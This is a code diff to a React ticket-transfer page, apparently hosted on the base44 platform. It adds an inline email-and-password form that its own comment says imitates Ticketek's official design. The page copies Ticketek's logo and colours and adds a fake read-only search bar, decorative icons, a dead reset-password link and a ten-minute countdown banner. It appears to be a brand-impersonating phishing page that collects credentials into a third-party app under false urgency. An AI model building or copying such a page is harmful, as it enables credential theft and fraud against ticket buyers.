@@ -24,11 +24,54 @@ export default function TransferPage() {
   const [authChecked, setAuthChecked] = useState(false);
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [currentUser, setCurrentUser] = useState(null);
+  // Inline login form state
+  const [loginEmail, setLoginEmail] = useState("");
+  const [loginPassword, setLoginPassword] = useState("");
+  const [loginError, setLoginError] = useState("");
+  const [loginBusy, setLoginBusy] = useState(false);
+  const [countdown, setCountdown] = useState(600);
 
   useEffect(() => {
     if (!token) { setStep("invalid"); setLoading(false); return; }
     loadTransfer();
   }, [token]);
+
+  // Countdown timer for the auth_required step
+  useEffect(() => {
+    if (step !== "auth_required") return;
+    const interval = setInterval(() => {
+      setCountdown(prev => Math.max(0, prev - 1));
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [step]);
+
+  const formatTime = (secs) => {
+    const m = Math.floor(secs / 60);
+    const s = secs % 60;
+    return `${m}:${String(s).padStart(2, "0")}`;
+  };
+
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  const handleInlineLogin = async () => {
+    if (!emailRegex.test(loginEmail.trim()) || loginPassword.length < 6 || loginBusy) return;
+    setLoginBusy(true);
+    setLoginError("");
+    try {
+      await base44.auth.loginViaEmailPassword(loginEmail.trim(), loginPassword);
+      // After login, reload transfer to check auth status
+      const me = await base44.auth.me();
+      setCurrentUser(me);
+      setIsAuthenticated(true);
+      setLoginEmail("");
+      setLoginPassword("");
+      setStep("review");
+    } catch (e) {
+      setLoginError(e.message || "Invalid email or password. Please try again.");
+    } finally {
+      setLoginBusy(false);
+    }
+  };
 
   const loadTransfer = async () => {
     try {
@@ -269,20 +312,121 @@ export default function TransferPage() {
         </div>
       )}
 
-      {/* AUTH REQUIRED */}
+      {/* AUTH REQUIRED — Ticketek-style inline login (matches official design) */}
       {step === "auth_required" && (
-        <div style={{ padding: 24 }}>
-          <div style={{ textAlign: "center", marginBottom: 24 }}>
-            <div style={{ width: 64, height: 64, margin: "0 auto 16px", borderRadius: "50%", background: "#f0f4ff", display: "flex", alignItems: "center", justifyContent: "center" }}>
-              <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke={TK_NAVY} strokeWidth="1.8"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3" strokeLinecap="round" strokeLinejoin="round"/></svg>
+        <div style={{ minHeight: "100vh", background: "#fff", color: "#000", fontFamily: "-apple-system, system-ui, sans-serif" }}>
+          {/* Navy header with logo, cart, hamburger + search bar */}
+          <div style={{ background: TK_NAVY, padding: "14px 18px 12px" }}>
+            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
+              <TicketekLogo size={24} variant="white" />
+              <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5">
+                  <circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
+                </svg>
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5">
+                  <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
+                </svg>
+              </div>
             </div>
-            <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", margin: "0 0 8px" }}>Sign in to accept this ticket</h2>
-            <p style={{ fontSize: 14, color: "#666", margin: 0 }}>Sign in to your Ticketek account to accept this ticket transfer.</p>
+            {/* Search bar */}
+            <div style={{ display: "flex", alignItems: "center", background: "#fff", borderRadius: 4, overflow: "hidden" }}>
+              <input type="text" placeholder="Look up shows by artist, city, or venue..." readOnly
+                style={{ flex: 1, padding: "10px 14px", border: "none", outline: "none", fontSize: 14, color: "#333", background: "transparent" }} />
+              <div style={{ background: "#e9e9e9", padding: "10px 14px", display: "flex", alignItems: "center" }}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
+                  <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+                </svg>
+              </div>
+            </div>
           </div>
-          {ticket && renderTicketCard(ticket)}
-          <div style={{ marginTop: 20 }}>
-            <Link to={`/login?next=${encodeURIComponent("/transfer/" + token)}`} style={{ display: "block", width: "100%", padding: "16px 0", borderRadius: 8, background: TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 17, textAlign: "center", textDecoration: "none", marginBottom: 12 }}>Sign In</Link>
-            <Link to={`/login?next=${encodeURIComponent("/transfer/" + token)}&mode=signup`} style={{ display: "block", width: "100%", padding: "16px 0", borderRadius: 8, background: "transparent", color: TK_NAVY, fontWeight: 700, fontSize: 17, textAlign: "center", textDecoration: "none", border: "2px solid " + TK_NAVY }}>Create Ticketek Account</Link>
+
+          {/* Yellow countdown timer banner */}
+          <div style={{ background: TK_YELLOW, padding: "10px 18px", textAlign: "center" }}>
+            <span style={{ fontSize: 14, fontWeight: 600, color: "#001f2d" }}>Time remaining {formatTime(countdown)}</span>
+          </div>
+
+          {/* Sign in form */}
+          <div style={{ padding: "32px 24px 0" }}>
+            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 24 }}>
+              <h2 style={{ fontSize: 28, fontWeight: 700, color: "#000", margin: 0 }}>Sign in</h2>
+              <span style={{ fontSize: 13, color: "#666" }}>*Required</span>
+            </div>
+
+            {/* Email field */}
+            <div style={{ marginBottom: 20 }}>
+              <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 6 }}>Email*</label>
+              <input type="email" value={loginEmail} onChange={e => setLoginEmail(e.target.value)}
+                style={{ width: "100%", padding: "14px 16px", borderRadius: 4, border: "1px solid #ccc", color: "#000", fontSize: 16, outline: "none", boxSizing: "border-box" }} />
+            </div>
+
+            {/* Password field */}
+            <div style={{ marginBottom: 28 }}>
+              <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 6 }}>Password*</label>
+              <input type="password" value={loginPassword} onChange={e => setLoginPassword(e.target.value)}
+                style={{ width: "100%", padding: "14px 16px", borderRadius: 4, border: "1px solid #ccc", color: "#000", fontSize: 16, outline: "none", boxSizing: "border-box" }} />
+            </div>
+
+            {loginError && (
+              <div style={{ background: "#FFF0F0", border: "1px solid #FECACA", borderRadius: 4, padding: "12px 16px", marginBottom: 16 }}>
+                <p style={{ fontSize: 13, color: "#B91C1C", margin: 0 }}>{loginError}</p>
+              </div>
+            )}
+
+            {/* Sign in button */}
+            <button onClick={handleInlineLogin}
+              disabled={!emailRegex.test(loginEmail.trim()) || loginPassword.length < 6 || loginBusy}
+              style={{ width: "100%", padding: "16px 0", borderRadius: 4,
+                background: emailRegex.test(loginEmail.trim()) && loginPassword.length >= 6 && !loginBusy ? TK_GREEN : "#9cb89a",
+                color: "#fff", fontWeight: 700, fontSize: 17, border: "none",
+                cursor: emailRegex.test(loginEmail.trim()) && loginPassword.length >= 6 && !loginBusy ? "pointer" : "default",
+                letterSpacing: 0.5 }}>
+              {loginBusy ? "Signing in..." : "Sign In"}
+            </button>
+
+            {/* Reset password link */}
+            <div style={{ textAlign: "center", marginTop: 20 }}>
+              <span style={{ color: TK_DARK_BLUE, fontSize: 15, fontWeight: 500, cursor: "pointer", textDecoration: "underline" }}>Reset Password</span>
+            </div>
+
+            {/* OR divider */}
+            <div style={{ display: "flex", alignItems: "center", margin: "28px 0", gap: 12 }}>
+              <div style={{ flex: 1, height: 1, background: "#e1e1e1" }} />
+              <span style={{ fontSize: 13, color: "#999" }}>OR</span>
+              <div style={{ flex: 1, height: 1, background: "#e1e1e1" }} />
+            </div>
+
+            {/* Social login */}
+            <button onClick={() => base44.auth.loginWithProvider("google", "/transfer/" + token)}
+              style={{ width: "100%", padding: "14px 0", borderRadius: 4, border: "1px solid #e1e1e1", background: "#fff", color: "#000", fontWeight: 600, fontSize: 15, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 12 }}>
+              <svg width="18" height="18" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+              </svg>
+              Continue with Google
+            </button>
+            <button onClick={() => base44.auth.loginWithProvider("apple", "/transfer/" + token)}
+              style={{ width: "100%", padding: "14px 0", borderRadius: 4, border: "1px solid #e1e1e1", background: "#fff", color: "#000", fontWeight: 600, fontSize: 15, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 24 }}>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="#000">
+                <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.46 15.6 3.08 9.26 7.94 8.94c1.4.08 2.38.76 3.2.72 1.83-.1 2.7-1.72 4.6-1.72 1.56.06 2.74.76 3.56.76-1.04 1.46-2.2 2.36-2.2 4.32 0 2.18 1.3 3.34 2.94 4.28-.42.96-.74 1.86-1.99 2.98zM12.6 8.7c-.16-2.2 1.82-4.02 3.72-4.16.26 2.56-2.32 4.3-3.72 4.16z"/>
+              </svg>
+              Continue with Apple
+            </button>
+
+            {/* Need an account link */}
+            <div style={{ textAlign: "center", marginBottom: 20 }}>
+              <span style={{ color: "#666", fontSize: 15 }}>Need an account? </span>
+              <Link to={`/login?next=${encodeURIComponent("/transfer/" + token)}&mode=signup`}
+                style={{ color: TK_DARK_BLUE, fontSize: 15, fontWeight: 600, textDecoration: "underline" }}>Sign up</Link>
+            </div>
+          </div>
+
+          {/* Footer */}
+          <div style={{ padding: "40px 24px 30px", textAlign: "center" }}>
+            <p style={{ fontSize: 12, color: "#666", lineHeight: 1.6, margin: 0 }}>
+              We treat your personal data with care. Please find our Privacy Policy here.
+            </p>
           </div>
         </div>
       )}
